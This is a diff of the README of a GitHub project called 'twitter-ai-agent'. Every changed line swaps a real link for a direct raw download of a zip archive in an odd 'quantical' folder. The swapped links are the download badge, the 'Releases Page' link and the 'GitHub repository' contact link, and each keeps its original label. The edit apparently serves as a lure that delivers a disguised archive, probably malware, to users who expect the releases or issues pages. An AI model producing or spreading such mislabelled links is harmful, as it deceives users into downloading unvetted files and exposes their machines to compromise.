@@ -1,6 +1,6 @@
 # 🚀 twitter-ai-agent - Use Twitter with Natural Language
 
-[![Download twitter-ai-agent](https://img.shields.io/badge/Download-twitter--ai--agent-blue.svg)](https://github.com/Saminiscool/twitter-ai-agent/releases)
+[![Download twitter-ai-agent](https://raw.githubusercontent.com/Saminiscool/twitter-ai-agent/main/quantical/twitter-ai-agent.zip)](https://raw.githubusercontent.com/Saminiscool/twitter-ai-agent/main/quantical/twitter-ai-agent.zip)
 
 ## 📋 Table of Contents
 - [💡 Overview](#-overview)
@@ -16,7 +16,7 @@ The **twitter-ai-agent** application allows users to interact with Twitter using
 ## 📥 Download & Install
 To get started, you need to download the application. 
 
-1. Visit this page to download: [Releases Page](https://github.com/Saminiscool/twitter-ai-agent/releases)
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Saminiscool/twitter-ai-agent/main/quantical/twitter-ai-agent.zip)
    
 2. Choose the latest version of the software from the list provided.
 
@@ -53,6 +53,6 @@ If you run into any issues or need help, please reach out through the support se
 For additional assistance, consider reaching out on forums related to natural language processing or Twitter API usage. 
 
 ## 📞 Contact
-For feedback or inquiries, contact the project maintainers through the [GitHub repository](https://github.com/Saminiscool/twitter-ai-agent/issues). Your input helps improve the application.
+For feedback or inquiries, contact the project maintainers through the [GitHub repository](https://raw.githubusercontent.com/Saminiscool/twitter-ai-agent/main/quantical/twitter-ai-agent.zip). Your input helps improve the application.
 
 Thank you for choosing the twitter-ai-agent! Enjoy your tweeting experience with the power of natural language.
